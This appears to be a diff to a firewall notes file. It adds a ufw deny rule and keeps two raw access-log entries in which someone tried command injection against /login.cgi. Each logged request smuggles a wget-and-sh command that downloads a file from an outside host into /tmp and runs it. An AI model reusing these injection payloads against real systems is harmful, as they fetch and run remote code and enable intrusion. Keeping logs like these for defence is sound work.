@@ -1,4 +1,6 @@
 sudo ufw deny from 192.168.1.5 to any
+ufw deny proto tcp from 66.249.0.0 to 66.249.255.255 port 80
+
 
 5.150.131.172 - - [21/Aug/2018:02:36:07 -0400] "GET /login.cgi?cli=aa%20aa%27;wget%20http://209.141.33.86/d%20-O%20-%3E%20/tmp/.shinka;sh%20/tmp/.shinka%27$ HTTP/1.1" 400 -
 156.221.24.192 - - [21/Aug/2018:02:44:52 -0400] "GET /login.cgi?cli=aa%20aa%27;wget%20http://50.115.166.136/bin%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 -
